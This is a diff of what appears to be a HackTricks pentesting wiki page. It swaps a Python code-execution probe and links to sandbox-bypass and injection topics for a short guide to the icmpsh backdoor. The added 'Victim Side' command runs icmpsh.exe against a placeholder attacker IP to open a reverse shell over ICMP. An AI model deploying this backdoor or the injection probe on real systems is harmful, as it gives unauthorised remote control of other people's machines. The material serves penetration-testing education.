@@ -1,4 +1,4 @@
-# Python
+# ICMPsh
 
 <details>
 
@@ -16,27 +16,33 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-## Server using python
+Download the backdoor from: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
 
-test a possible **code execution**, using the function _str()_:
+## Client side
 
-```python
-"+str(True)+" #If the string True is printed, then it is vulnerable
+Execute the script: **run.sh**
+
+**If you get some error, try to change the lines:**
+
+```bash
+IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
+IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
 ```
 
-### Tricks
+**For:**
 
-{% content-ref url="../../misc/basic-python/bypass-python-sandboxes/" %}
-[bypass-python-sandboxes](../../misc/basic-python/bypass-python-sandboxes/)
-{% endcontent-ref %}
+```bash
+echo Please insert the IP where you want to listen
+read IP
+```
 
-{% content-ref url="../../pentesting-web/ssti-server-side-template-injection/" %}
-[ssti-server-side-template-injection](../../pentesting-web/ssti-server-side-template-injection/)
-{% endcontent-ref %}
+## **Victim Side**
 
-{% content-ref url="../../pentesting-web/deserialization/" %}
-[deserialization](../../pentesting-web/deserialization/)
-{% endcontent-ref %}
+Upload **icmpsh.exe** to the victim and execute:
+
+```bash
+icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
+```
 
 <details>
 
